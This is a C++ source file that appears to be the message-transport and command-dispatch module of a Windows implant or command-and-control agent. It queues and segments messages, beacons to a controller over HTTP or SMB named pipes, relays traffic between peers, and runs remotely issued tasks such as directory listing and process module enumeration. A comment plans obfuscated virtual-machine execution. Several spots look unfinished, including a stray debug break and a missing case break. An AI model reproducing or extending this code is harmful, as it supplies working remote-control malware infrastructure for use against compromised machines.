#include <core/corelib.hpp>
namespace Message {

    RDATA_SECTION COMMAND_MAP CmdMap[] = {
        { .Id = CommandDir,         .Function = Commands::DirectoryList },
        { .Id = CommandMods,        .Function = Commands::ProcessModules },
        { .Id = CommandUpdatePeer,  .Function = Commands::UpdatePeer },
        { .Id = CommandShutdown,    .Function = Commands::Shutdown },
        { .Id = 0,                  .Function = nullptr }
    };

    BOOL PeekPID(PSTREAM Stream) {
        HEXANE
        UINT Pid = 0;

        x_memcpy(&Pid, Stream->Buffer, 4);
        if (x_memcmp(&Ctx->Session.PeerId, &Pid, 4) == 0) {
            return TRUE;
        }

        return FALSE;
    }

    VOID AddMessage(PSTREAM Outbound) {
        HEXANE
        PSTREAM Head = Ctx->Transport.OutboundQueue;

        if (!Ctx->Transport.OutboundQueue) {
            Ctx->Transport.OutboundQueue = Outbound;
        } else {
            while (Head->Next) {
                Head = Head->Next;
            }

            Head->Next = Outbound;
        }
    }

    VOID ClearQueue() {
        HEXANE

        PSTREAM Head = Ctx->Transport.OutboundQueue;
        PSTREAM Swap = { };
        PSTREAM Prev = { };

        if (!Head) {
            Ctx->Transport.OutboundQueue = nullptr;
            return_defer(ERROR_SUCCESS);
        }

        while (Head) {
            if (Head->Ready) {
                if (Prev) {
                    Prev->Next = Head->Next;

                } else {
                    Ctx->Transport.OutboundQueue = Head->Next;
                }

                Swap = Head;
                Head = Head->Next;
                Stream::DestroyStream(Swap);

            } else {
                Prev = Head;
                Head = Head->Next;
            }
        }

        defer:
    }

    VOID OutboundQueue(PSTREAM Outbound) {
        HEXANE

        PARSER Parser   = { };
        PSTREAM Queue   = { };

        if (!Outbound) {
            return_defer(ERROR_NO_DATA);
        }

        if (Outbound->Length > MESSAGE_MAX) {
            QueueSegments(S_CAST(PBYTE, Outbound->Buffer), Outbound->Length);

        } else {
            Parser::CreateParser(&Parser, S_CAST(PBYTE, Outbound->Buffer), Outbound->Length);

            Queue           = Stream::CreateStream();
            Queue->PeerId   = __bswapd(S_CAST(ULONG, Parser::UnpackDword(&Parser)));
            Queue->TaskId   = __bswapd(S_CAST(ULONG, Parser::UnpackDword(&Parser)));
            Queue->MsgType  = __bswapd(S_CAST(ULONG, Parser::UnpackDword(&Parser)));

            Queue->Length   = Parser.Length;
            Queue->Buffer   = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, 0, Queue->Buffer, Queue->Length);

            x_memcpy(Queue->Buffer, Parser.Buffer, Queue->Length);
            AddMessage(Queue);

            Parser::DestroyParser(&Parser);
            Stream::DestroyStream(Outbound);
        }

        defer:
    }

    VOID QueueSegments(PBYTE Buffer, ULONG Length) {
        HEXANE

        PSTREAM Queue   = { };
        ULONG Offset    = 0;
        ULONG PeerId    = 0;
        ULONG TaskId    = 0;
        ULONG cbSeg     = 0;
        ULONG Index     = 1;
        ULONG nSegs     = (Length + MESSAGE_MAX - 1) / MESSAGE_MAX;

        while (Length > 0) {
            cbSeg   = Length > MESSAGE_MAX - SEGMENT_HEADER_SIZE ? MESSAGE_MAX - SEGMENT_HEADER_SIZE : Length;
            Queue    = S_CAST(PSTREAM, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, cbSeg + SEGMENT_HEADER_SIZE));

            x_memcpy(&PeerId, Buffer, 4);
            x_memcpy(&TaskId, Buffer + 4, 4);

            Queue->PeerId    = PeerId;
            Queue->TaskId    = TaskId;
            Queue->MsgType   = TypeSegment;

            Stream::PackDword(Queue, Index);
            Stream::PackDword(Queue, nSegs);
            Stream::PackDword(Queue, cbSeg);
            Stream::PackBytes(Queue, S_CAST(PBYTE, Buffer) + Offset, cbSeg);

            Index++;
            Length -= cbSeg;
            Offset += cbSeg;

            AddMessage(Queue);
        }
    }

    VOID MessageTransmit() {
        HEXANE

        PSTREAM Outbound    = Stream::CreateStream();
        PSTREAM Inbound     = { };
        PSTREAM Head        = { };
        PSTREAM Swap        = { };
        PARSER Parser       = { };

        retry:

        if (!Ctx->Transport.OutboundQueue) {
#ifdef TRANSPORT_SMB
            return_defer(ERROR_SUCCESS);
#elifdef TRANSPORT_HTTP
            PSTREAM Task = Stream::CreateStreamWithHeaders(TypeTasking);
            OutboundQueue(Task);

            goto retry;
#endif
        } else {
            Head = Ctx->Transport.OutboundQueue;
            while (Head) {
                if (!Head->Ready) {

                    if (Head->Length + MESSAGE_HEADER_SIZE + Outbound->Length > MESSAGE_MAX) {
                        break;
                    }
                    if (Head->Buffer) {
                        Parser::CreateParser(&Parser, S_CAST(PBYTE, Head->Buffer), Head->Length);
                        Stream::PackDword(Outbound, Head->PeerId);
                        Stream::PackDword(Outbound, Head->TaskId);
                        Stream::PackDword(Outbound, Head->MsgType);

                        if (Ctx->Root) {
                            Stream::PackBytes(Outbound, S_CAST(PBYTE, Head->Buffer), Head->Length);
                        } else {
                            Outbound->Buffer = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, 0, Outbound->Buffer, Outbound->Length + Head->Length);
                            x_memcpy(S_CAST(PBYTE, Outbound->Buffer) + Outbound->Length, Head->Buffer, Head->Length);

                            Outbound->Length += Head->Length;
                        }
                    } else {
                        return_defer(ERROR_NO_DATA);
                    }

                    Head->Ready = TRUE;
                }

                Head = Head->Next;
            }
        }

#ifdef TRANSPORT_HTTP
        Http::HttpCallback(Outbound, &Inbound);
#endif
#ifdef TRANSPORT_PIPE
        Smb::PeerConnectEgress(Outbound, &Inbound);
#endif
        Stream::DestroyStream(Outbound);
        Outbound = nullptr;

        if (Inbound) {
            ClearQueue();

            if (PeekPID(Inbound)) {
                CommandDispatch(Inbound);
                Stream::DestroyStream(Inbound);
            } else {
                Swap        = Inbound;
                Inbound     = Outbound;
                Outbound    = Swap;

                if (Ctx->Config.IngressPipename) {
                    Smb::PeerConnectIngress(Outbound, &Inbound);

                    if (Inbound) {
                        OutboundQueue(Inbound);
                    }
                }

                Stream::DestroyStream(Outbound);
            }
        } else {
            Head = Ctx->Transport.OutboundQueue;
            while (Head) {
                Head->Ready = FALSE;
                Head = Head->Next;
            }
        }

    defer:
    }

    VOID CommandDispatch (PSTREAM Inbound) {
        HEXANE

        PARSER Parser   = { };
        ULONG MsgType   = 0;

        Parser::CreateParser(&Parser, S_CAST(PBYTE, Inbound->Buffer), Inbound->Length);
        Parser::UnpackDword(&Parser); // throw-away peer id

        Ctx->Session.CurrentTaskId  = Parser::UnpackDword(&Parser);
        MsgType                     = Parser::UnpackDword(&Parser);

        switch (MsgType) {

            case TypeCheckin: {
                Ctx->Session.Checkin = TRUE;
                break;
            }

            case TypeTasking: {

                auto CmdId = Parser::UnpackDword(&Parser);
                if (CmdId == CommandNoJob) {
                    break;
                }

                __debugbreak();
                for (uint32_t FnCounter = 0;; FnCounter++) {
                    if (!CmdMap[FnCounter].Function) {
                        return_defer(ERROR_PROC_NOT_FOUND);
                    }

                    if (CmdMap[FnCounter].Id == CmdId) {
                        auto Cmd = R_CAST(CmdSignature, Ctx->Base.Address + R_CAST(UINT_PTR, CmdMap[FnCounter].Function));
                        Cmd(&Parser);
                        break;
                    }
                }
            }

            case TypeVMExecute: {
                /*
                 * todo: vm inline code execution
                 * Considerations:
                 *
                 * - the entire process should be setting up virtual registers
                 *      - VIP (array of instructions)
                 *      - VSP
                 *      - HANDLER
                 *      - DKEY (optional)
                 *      - MODULE BASE
                 *      - VREGS
                 *
                 * 1. Push all native registers to the stack
                 * 2. Load module base into a register + save it onto the stack
                 * 3. (optional) Load RVA to next bytecode instruction into reg for decryption
                 * 4. Allocate space on the stack for scratch registers and point a native reg at this
                 *      - remember to save rsp first before modifying it
                 *      - remember alignment
                 * 5. Load vm-handler pointer
                 */
            }
            default:
                break;
        }

        defer:
        Parser::DestroyParser(&Parser);
    }
}
